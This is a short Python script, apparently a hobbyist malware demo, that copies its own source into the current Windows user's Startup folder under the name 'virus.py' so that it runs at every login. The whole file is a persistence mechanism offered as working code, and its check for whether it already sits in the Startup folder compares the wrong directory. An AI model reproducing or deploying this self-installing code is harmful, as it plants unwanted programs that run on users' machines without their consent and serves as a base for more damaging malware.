import os

startup = "C:/Users/%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup" % os.getlogin()


file_location = os.path.dirname(os.path.realpath(__file__))

folder_containing = os.path.dirname(file_location)

if not folder_containing == startup:


    # add this file in startup folder
    if os.path.isdir(startup):
        with open(startup + "/virus.py", "w") as f:
            f.write(open(__file__).read())
            
            print("File added to startup folder")
            
            print(startup)
            
    else:
        print("Startup folder not found")
